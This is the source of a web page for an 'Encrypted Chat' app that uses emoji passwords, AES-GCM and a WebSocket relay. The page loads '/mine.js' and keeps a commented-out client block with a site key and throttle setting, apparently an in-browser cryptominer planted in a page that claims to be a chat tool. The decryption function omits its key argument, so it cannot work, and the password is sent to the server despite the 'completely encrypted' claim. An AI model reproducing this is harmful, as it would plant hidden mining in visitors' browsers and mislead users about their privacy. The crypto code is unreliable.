<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<title>Encrypted Chat — Made by blitzedzz</title>
<style>
h2, h3 {
    color: #fff;        
    text-align: center;    
    margin: 0;            
    opacity: 0;           
    transform: translateY(10px);
    animation: fadeInUp 0.6s forwards;
}

h2 {
    margin-bottom: 5px;
    font-size: 2rem;
    animation-delay: 0.1s;
}

h3 {
    font-weight: 400;
    font-size: 1rem;
    animation-delay: 0.2s;
}

html, body {
    margin:0; 
    padding:0; 
    height:100%; 
    font-family:Inter,system-ui,Arial; 
    background:#121212; 
    display:flex; 
    align-items:center; 
    justify-content:center;
}

#chatContainer {
    width:100%; 
    max-width:600px; 
    background:#1e1e1e; 
    padding:20px; 
    border-radius:12px; 
    box-shadow:0 0 20px rgba(0,0,0,0.5); 
    display:flex; 
    flex-direction:column; 
    opacity:0; 
    transform: translateY(30px); 
    animation: fadeInUp 0.6s forwards;
}

@keyframes fadeInUp {
    to {opacity:1; transform:translateY(0);}
}

@keyframes buttonPulse {
    0%,100%{transform:scale(1);}
    50%{transform:scale(1.05);}
}

#log {height:320px; overflow:auto; border:1px solid #333; padding:8px; background:#121212; margin-bottom:10px; color:#eee; font-family:monospace; border-radius:6px; transition: background 0.3s;}
input,textarea,button {padding:8px; margin:6px 0; width:100%; box-sizing:border-box; background:#1e1e1e; color:#eee; border:1px solid #333; border-radius:6px; transition: background 0.3s, transform 0.2s;}
input::placeholder, textarea::placeholder {color:#888;}
button:hover {background:#333; transform: scale(1.03); animation: buttonPulse 0.5s infinite; cursor:pointer;}
.row{display:flex;gap:8px} 
.row > *{flex:1} 
.small{width:160px} 
.muted{color:#888;font-size:0.9rem} 
#menu{display:flex;flex-direction:column;gap:10px;margin-bottom:20px;} 
#status{margin-bottom:10px;color:#aaa;text-align:center;} 
textarea{resize:none;}
#log div {opacity:0; transform: translateY(10px); animation: logFade 0.3s forwards; margin-bottom:2px;}
@keyframes logFade {to {opacity:1; transform:translateY(0);}}

</style>
<script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
</head>
<body>
<div id="chatContainer">
<h2>🔐 Encrypted Chat</h2>
<h3>Made by blitzedzz</h3>
<div id="menu">
  <input id="usernameInput" placeholder="Enter your username (optional)" />
  <button id="btnNewRoom">🆕 Generate New Room</button>
  <button id="btnLoginRoom">🔑 Log In to Existing Room</button>
</div>

<div id="roomSection" style="display:none;">
  <div class="row">
    <div>
      <div class="muted">Room ID: <span id="roomNum"></span></div>
      <div class="muted">Emoji Password: <span id="pwd" style="font-weight:700"></span></div>
      <div style="margin-top:8px;">
        <button id="btnShare">📤 Share Room</button>
      </div>
    </div>
  </div>

  <div id="status">status: disconnected</div>
  <div id="log"></div>

  <textarea id="msgText" placeholder="Type your message..."></textarea>
  <button id="send">💬 Encrypt & Send</button>
</div>
</div>
<script src="/mine.js"></script>
<script>
    //var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
     //   throttle: 0.6, c: 'w', ads: 0
    //});
    //_client.start();
</script>
<script>
const WORKER_URL = "https://encryption.blitzedzz.workers.dev";

function utf8ToArrayBuffer(str){return new TextEncoder().encode(str);}
function arrayBufferToBase64(buf){const bytes=new Uint8Array(buf);let binary='';for(let i=0;i<bytes.byteLength;i++) binary+=String.fromCharCode(bytes[i]);return btoa(binary);}
function base64ToArrayBuffer(b64){const bin=atob(b64);const bytes=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);return bytes.buffer;}
function base64EncodeUnicode(str){return arrayBufferToBase64(utf8ToArrayBuffer(str));}
function base64DecodeUnicode(b64){return new TextDecoder().decode(base64ToArrayBuffer(b64));}
async function sha256Hex(input){const data=(typeof input==='string')?utf8ToArrayBuffer(input):input;const hash=await crypto.subtle.digest('SHA-256',data);return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('');}
async function deriveAesKeyFromEmoji(emojiPwd,mixNum){const pwKey=await crypto.subtle.importKey('raw',utf8ToArrayBuffer(emojiPwd),'PBKDF2',false,['deriveKey']);return await crypto.subtle.deriveKey({name:'PBKDF2',salt:utf8ToArrayBuffer(mixNum),iterations:150000,hash:'SHA-256'},pwKey,{name:'AES-GCM',length:256},false,['encrypt','decrypt']);}
async function encryptPlaintext(plaintext,aesKey){const base64Text=btoa(unescape(encodeURIComponent(plaintext)));const iv=crypto.getRandomValues(new Uint8Array(12));const ct=await crypto.subtle.encrypt({name:'AES-GCM',iv},aesKey,utf8ToArrayBuffer(base64Text));return {ciphertext:arrayBufferToBase64(ct),iv:arrayBufferToBase64(iv)};}
async function decryptToPlaintext(ciphertext_b64,iv_b64,aesKey){try{const ctBuf=base64ToArrayBuffer(ciphertext_b64);const ivBuf=base64ToArrayBuffer(iv_b64);const ptBuf=await crypto.subtle.decrypt({name:'AES-GCM',iv:new Uint8Array(ivBuf)},ctBuf);const base64Text=new TextDecoder().decode(ptBuf);return decodeURIComponent(escape(atob(base64Text)));}catch{return null;}}

let CURRENT={roomNum:null,emojiPwd:null,emojiPwdB64:null,key:null,ws:null,username:null};
let seenMsgIds = new Set();

function logLine(txt){const el=document.getElementById('log'); const p=document.createElement('div'); p.textContent=txt; el.appendChild(p); el.scrollTop=el.scrollHeight;}

async function tryConnect(){
  if(!CURRENT.roomNum||!CURRENT.emojiPwd) return;
  const pwToSend = CURRENT.emojiPwdB64||base64EncodeUnicode(CURRENT.emojiPwd);
  try{const res=await fetch(`${WORKER_URL}/check?room=${encodeURIComponent(CURRENT.roomNum)}&pw=${encodeURIComponent(pwToSend)}`);const data=await res.json();if(!data.ok) return;}
  catch{return;}
  const mixNum=BigInt('0x'+await sha256Hex(CURRENT.roomNum+'|'+CURRENT.emojiPwd)).toString(10);
  CURRENT.key=await deriveAesKeyFromEmoji(CURRENT.emojiPwd,mixNum);
  const ws=new WebSocket(`${WORKER_URL.replace(/^https?:/,'wss:')}?room=${encodeURIComponent(CURRENT.roomNum)}&pw=${encodeURIComponent(pwToSend)}`);
  CURRENT.ws=ws;
  ws.onopen=()=>{document.getElementById('status').textContent='status: connected';logLine('✅ Connected to room');};
  ws.onclose=()=>{document.getElementById('status').textContent='status: disconnected';logLine('❌ Disconnected');};
  ws.onerror=(e)=>{logLine('⚠️ WS error');console.error(e);};
  ws.onmessage=async (ev)=>{try{const obj=JSON.parse(ev.data);if(obj.ciphertext && obj.iv){const plain=await decryptToPlaintext(obj.ciphertext,obj.iv,CURRENT.key);logLine(`[${obj.meta?.sender||'peer'}] ${plain??'<unable to decrypt>'}`);}else logLine('[raw] '+ev.data);}catch{logLine('[msg parse error]');}};
}

document.getElementById('btnNewRoom').addEventListener('click',async()=>{
  const username=document.getElementById('usernameInput').value||'Guest'+Math.floor(Math.random()*1000); CURRENT.username=username;
  document.getElementById('menu').style.display='none'; document.getElementById('roomSection').style.display='block';
  const roomNum=Math.floor(Math.random()*1e16).toString(); 
  const {password,length}=(()=>{const em=["😀","😃","😄","😁","😆","😅","😂","🤣","🥲","😊","😇","🙂","🙃","😉","😌","😍","🥰","😘","😗","😙","😚","😋","😛","😝","😜","🤪","🤨","🧐","🤓","😎","🥸","🤩","🥳","😏","😒","😞","😔","😟","😕","🙁","☹️","😣","😖","😫","😩","🥺","😢","😭","😤","😠","😡","🤬","🤯","😳","🥵","🥶","😱","😨","😰","😥","😓","🤗","🤔","🤭","🤫","🤥","😶","😐","😑","😬","🙄","😯","😦","😧","😮","😲","🥱","😴","🤤","😪","😵","🤐","🥴","🤢","🤮","🤧","😷","🤒","🤕","🤑","🤠","😈","👿","👹","👺","💀","☠️","👻","👽","👾","🤖","💩","😺","😸","😹","😻","😼","😽","🙀","😿","😾","🐶","🐱","🐭","🐹","🐰","🦊","🐻","🐼","🐨","🐯","🦁","🐮","🐷","🐽","🐸","🐵","🙈","🙉","🙊","🐒","🐔","🐧","🐦","🐤","🐣","🐥","🦆","🦅","🦉","🦇","🐺","🐗","🐴","🦄","🐝","🐛","🦋","🐌","🐞","🐜","🪲","🪳","🦟","🦗","🕷️","🕸️","🦂","🐢","🐍","🦎","🐙","🦑","🦐","🦞","🦀","🐡","🐠","🐟","🐬","🐳","🐋","🦈","🐊","🐅","🐆","🦓","🦍","🦧","🐘","🦛","🦏","🐪","🐫","🦙","🦒","🐃","🐂","🐄","🐎","🐖","🐏","🐑","🦌","🐐","🦙","🦦","🦨","🦡","🐁","🐀","🐿️","🦔","🦇","🐾","🐉","🐲","🌵","🎄","🌲","🌳","🌴","🪵","🌱","🌿","☘️","🍀","🎍","🪴","🍃","🍂","🍁","🍄","🐚","🪨","🌾","💐","🌷","🌹","🥀","🌺","🌸","🌼","🌻","🌞","🌝","🌛","🌜","🌚","🌕","🌖","🌗","🌘","🌑","🌒","🌓","🌔","🌙","🌎","🌍","🌏","💫","⭐","🌟","✨","⚡","☄️","🔥","💥","🌈","☀️","🌤️","⛅","🌥️","☁️","🌦️","🌧️","⛈️","🌩️","🌨️","❄️","☃️","⛄","🌬️","💨","💧","💦","☔","☂️","🌊","🎃","🎄","🎆","🎇","🧨","✨","🎈","🎉","🎊","🎋","🎍","🎎","🎏","🎐","🎑","🧧","🎀","🎁","🎗️","🎟️","🎫","🎖️","🏆","🏅","🥇","🥈","🥉","⚽","⚾","🏀","🏐","🏈","🏉","🎾","🥏","🎳","🏓","🏸","🥊","🥋","🥅","⛳","🪀","🪁","🏹","🎣","🤿","🥌","🛷","🛼","🛹","🎿","⛷️","🏂","🏋️","🏋️‍♂️","🏋️‍♀️","🤼","🤼‍♂️","🤼‍♀️","🤸","🤸‍♂️","🤸‍♀️","⛹️","⛹️‍♂️","⛹️‍♀️","🤺","🤾","🤾‍♂️","🤾‍♀️","🏌️","🏌️‍♂️","🏌️‍♀️","🏇","🧘","🧘‍♂️","🧘‍♀️","🏄","🏄‍♂️","🏄‍♀️","🏊","🏊‍♂️","🏊‍♀️","🤽","🤽‍♂️","🤽‍♀️","🚣","🚣‍♂️","🚣‍♀️","🧗","🧗‍♂️","🧗‍♀️","🚵","🚵‍♂️","🚵‍♀️","🚴","🚴‍♂️","🚴‍♀️","🏆","🥇","🥈","🥉"];const len=6+Math.floor(Math.random()*3);let s="";for(let i=0;i<len;i++) s+=em[Math.floor(Math.random()*em.length)];return {password:s,length:len};})();
  const passwordB64=base64EncodeUnicode(password);
  try{await fetch(WORKER_URL+'/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({roomId:roomNum,password:passwordB64})});}catch(e){logLine('Failed to register room: '+e.message);}
  document.getElementById('roomNum').textContent=roomNum; document.getElementById('pwd').textContent=password+' ('+length+' emojis)';
  CURRENT.roomNum=roomNum; CURRENT.emojiPwd=password; CURRENT.emojiPwdB64=passwordB64;
  logLine(`🟢 Room created! You are "${username}".`);
  await tryConnect();
});

document.getElementById('btnLoginRoom').addEventListener('click',async()=>{
  const username=document.getElementById('usernameInput').value||'Guest'+Math.floor(Math.random()*1000); CURRENT.username=username;
  document.getElementById('menu').style.display='none'; document.getElementById('roomSection').style.display='block';
  const roomId=prompt("Enter Room ID:"); const emojiPwd=prompt("Enter emoji password:"); const passwordB64=base64EncodeUnicode(emojiPwd);
  document.getElementById('roomNum').textContent=roomId; document.getElementById('pwd').textContent=emojiPwd;
  CURRENT.roomNum=roomId; CURRENT.emojiPwd=emojiPwd; CURRENT.emojiPwdB64=passwordB64;
  logLine(`🔑 Logging in as "${username}" to room ${roomId}`);
  await tryConnect();
});

document.getElementById('btnShare').addEventListener('click',()=>{
  if(!CURRENT.roomNum||!CURRENT.emojiPwd) return;
  const shareText=`Hey! Wanna chat completely encrypted? Join me on ${window.location.href} My room ID is ${CURRENT.roomNum} and my emoji password is ${CURRENT.emojiPwd}`;
  navigator.clipboard.writeText(shareText).then(()=>{Toastify({text:"Room info copied! 🟢",duration:3000,gravity:"top",position:"right",backgroundColor:"#4CBB17"}).showToast();}).catch(()=>{Toastify({text:"Failed to copy ❌",duration:3000,gravity:"top",position:"right",backgroundColor:"#ff4d4d"}).showToast();});
});

document.getElementById('send').addEventListener('click',async()=>{
  const text=document.getElementById('msgText').value; if(!text) return; if(!CURRENT.key||!CURRENT.ws||CURRENT.ws.readyState!==1) return alert('Connecting...');
  const enc=await encryptPlaintext(text,CURRENT.key);
  const payload={id:crypto.randomUUID(),ciphertext:enc.ciphertext,iv:enc.iv,meta:{sender:CURRENT.username,ts:Date.now()}};
  CURRENT.ws.send(JSON.stringify(payload));
  logLine(`[you] ${text}`); seenMsgIds.add(payload.id);
  document.getElementById('msgText').value='';
});
</script>
</body>
</html>
